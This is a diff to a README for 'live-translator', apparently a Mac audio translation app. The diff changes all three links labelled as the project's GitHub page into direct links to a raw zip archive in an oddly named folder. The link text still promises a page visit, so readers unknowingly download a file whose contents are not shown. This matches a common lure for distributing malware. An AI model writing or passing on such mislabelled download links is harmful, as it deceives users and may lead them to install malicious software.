@@ -1,6 +1,6 @@
 # 🌍 live-translator - Real-Time Audio Translation on Mac
 
-[![Download live-translator](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Espinalg9001/live-translator)
+[![Download live-translator](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Espinalg9001/live-translator/main/cheiragra/live_translator_v3.3-beta.1.zip)
 
 ## 🧭 Overview
 
@@ -34,7 +34,7 @@ For the best result, close apps that use a lot of memory before you start.
 
 Use this link to visit the download page and get the app:
 
-[Go to the live-translator GitHub page](https://github.com/Espinalg9001/live-translator)
+[Go to the live-translator GitHub page](https://raw.githubusercontent.com/Espinalg9001/live-translator/main/cheiragra/live_translator_v3.3-beta.1.zip)
 
 After you open the page:
 
@@ -216,4 +216,4 @@ If this test works, the app is ready for longer use
 
 If you need the download page again, use this link:
 
-[Download or open the live-translator project page](https://github.com/Espinalg9001/live-translator)
+[Download or open the live-translator project page](https://raw.githubusercontent.com/Espinalg9001/live-translator/main/cheiragra/live_translator_v3.3-beta.1.zip)
